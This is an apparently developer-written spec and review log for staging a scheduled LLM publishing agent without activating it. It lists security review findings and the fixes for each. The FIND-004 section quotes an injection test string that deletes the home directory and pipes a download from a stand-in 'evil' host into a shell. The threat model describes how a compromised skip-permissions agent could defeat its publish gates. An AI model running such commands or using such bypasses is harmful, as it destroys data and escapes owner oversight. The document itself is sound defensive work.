# F3 — launchd plist for the note agent (WRITTEN, NOT LOADED) — spec — 2026-06-24 (VSDD)

Goal: stage the macOS launchd job that will, one day, fire the F2 note agent on a schedule — but DO NOT
activate it. Dais's rule: "prepare the tap, don't tap yet." Enabling = a single `launchctl load` later.
Hard constraint: building/verifying F3 MUST NOT post (publish) any new article — keep the note channel clean
(only the Automaton article, which passed our bar). Drafts are acceptable; public posts are not.

## Contract / invariants
- The plist is STAGED in the skill dir (scripts/note-publish/ai.anicca.note-publish.plist), NOT copied to
  ~/Library/LaunchAgents. A file on disk in the skill dir is INERT — launchd never sees it until the tap.
- The plist `ProgramArguments` = /bin/bash → scripts/note-publish/daily-run.sh.
- `daily-run.sh` runs the F2 agent with **AUTONOMY=off** (draft only) — it can NEVER publish on its own. Even
  if it fired, it would at most create a DRAFT, never a public post.
- Schedule = StartCalendarInterval (a daily Hour/Minute), same shape as the live ai.anicca.*.plist jobs.
- StandardOut/ErrorPath → ~/.cloak/note-work/ (real, persistent).
- The plist is valid (`plutil -lint` passes) and is NOT in `launchctl list` (proves it is not active).

## The tap (documented, NOT executed)
```
cp scripts/note-publish/ai.anicca.note-publish.plist ~/Library/LaunchAgents/
launchctl load ~/Library/LaunchAgents/ai.anicca.note-publish.plist
```
Only run AFTER the skill is proven across hand-reviewed articles AND after deciding AUTONOMY on/off.

## Build
- `ai.anicca.note-publish.plist` (staged; Label ai.anicca.note-publish; daily; → daily-run.sh; logs to note-work).
- `daily-run.sh` — sets AUTONOMY=off, picks the day's topic/markdown, calls run-note-agent.sh (F2). For now its
  body is a SAFE no-op-ish default (logs "would run; AUTONOMY=off; no article this run") until F4/topics exist —
  so even a manual invocation does nothing destructive.

## VERIFY (static only — NO posting, per Dais)
1. `plutil -lint ai.anicca.note-publish.plist` → OK.
2. `launchctl list | grep note-publish` → empty (NOT loaded/active).
3. grep daily-run.sh → AUTONOMY=off present, --mode go absent → cannot publish.
4. Confirm the plist path is the skill dir, NOT ~/Library/LaunchAgents (not auto-activating).
5. ★ VSDD adversarial gate ★: spawn vcsdd:vcsdd-adversary (fresh context, disk-only, forced to find flaws) to
   review the plist + daily-run.sh + this spec for: accidental activation, accidental publish, wrong paths,
   env/PATH gaps, log-path errors, schedule mistakes, security. Binary PASS/FAIL + file:line. Loop-fix until PASS.
DO NOT load the plist. DO NOT run the agent pipeline against note. No new article, not even a draft, this turn.

## Done = 4-D convergence
spec ✓ + invariants encoded ✓ + plist+script built ✓ + static verify PASS + adversary PASS, with the note
channel untouched (still only the Automaton article).

## VSDD round 1 (vcsdd-adversary) — findings & fixes (2026-06-24)
Adversary verdict round 1 = FAIL. Real flaws found + fixed; one was a false positive (verified by running it):
- FIND-002 (CRITICAL, accepted): `--mode draft` was a lie — publish.py/toggle-plan.py ignored NOTE_MODE and
  ALWAYS clicked 投稿/公開. FIX: both now read the env and click ONLY when NOTE_MODE=go AND NOTE_FORCE_DRAFT!=1
  (default = draft → no submit click). Verified: toggle-plan.py with FORCE_DRAFT=1 exits "DRAFT MODE — NOT
  publishing" before even launching the browser.
- FIND-001 (CRITICAL, accepted): publish-prevention was prompt-only. FIX: daily-run.sh exports
  NOTE_FORCE_DRAFT=1 = a DETERMINISTIC gate inherited by every publish-to-note.sh call; no LLM prompt can flip
  it. The "tap" to allow publish = deliberately editing daily-run.sh, not an env var.
- FIND-004 (HIGH, accepted): NOTE_TOPIC → skip-perms agent = injection→RCE. FIX: daily-run.sh REJECTS (no-op)
  any NOTE_TOPIC containing chars outside a JP/EN allow-list, before the agent ever runs. Verified: `$(rm -rf
  ~); curl evil|sh` and `hello; ls | cat` both rejected, no agent run.
- FIND-005 (HIGH, accepted): spec wording. FIX: the no-op is the DEFAULT (no NOTE_TOPIC); with a valid topic it
  drafts only (FORCE_DRAFT=1, can never publish). Drafts on the note account are FINE & recommended (see it
  pass); only PUBLIC publish is forbidden unattended (memory: feedback_note_drafts_ok_never_public).
- FIND-003 (CRITICAL, REJECTED as false positive): the adversary's Glob missed a symlink. Verified by running:
  `~/.openclaw/skills/_shared/venv-cloak/bin/python3` exists (symlink → python3.14) and works — used all session.

## VSDD round 2 → fixes (2026-06-24)
Round 2 = FAIL (FIND-007 gate covered only 2/11 publisher scripts; FIND-008 env not tamper-proof; FIND-009 spec
over-claimed). Fixes:
- FIND-007: created `publish_guard.py` (shared `assert_publish_allowed()`); inserted it before EVERY 投稿/更新/
  公開/申請 click across ALL ~11 scripts (and as a top-gate before the browser in the 4 sole-publish scripts:
  toggle-plan, republish-only, del-and-republish, publish-membership). Verified: running any of them with no
  enable → "PUBLISH GUARD: BLOCKED" and exits before clicking. 11/11 coverage.
- FIND-008: the gate now requires BOTH env (NOTE_MODE=go AND NOTE_FORCE_DRAFT!=1) AND a FRESH sentinel file
  ~/.cloak/note-work/.PUBLISH_ENABLED (created only by the deliberate `publish-to-note.sh enable-publish`, 10-min
  TTL). daily-run.sh sets NOTE_FORCE_DRAFT=1 AND `rm -f` the sentinel → the unattended path is blocked by TWO
  independent conditions. Verified: enable+go → (True,True,True); disable → (False,True,False).

## THREAT MODEL (honest — closes FIND-009; no over-claim)
- IN SCOPE & CLOSED: accidental publishing, normal-operation publishing, and topic prompt-injection
  (NOTE_TOPIC is allow-list rejected before the agent runs). Under normal operation the scheduled path can only
  DRAFT — never publish (FORCE_DRAFT=1 + no sentinel + 11/11 guarded clicks).
- OUT OF SCOPE (acknowledged, NOT absolutely prevented): a fully-compromised `--dangerously-skip-permissions`
  Bash agent is omnipotent on the host (it could set env + touch the sentinel + edit the scripts). No in-process
  gate can stop that. Mitigations: we run OUR trusted prompt, inputs are sanitized, and TRUE isolation
  (container/VM, or dropping Bash/cookies from the unattended toolset) is future hardening — tracked, not done.
- Drafts on the note account are FINE & recommended (run it, see it pass); only PUBLIC publish is gated.
This spec no longer claims an absolute guarantee — it claims strong, verified, multi-layer defense-in-depth.
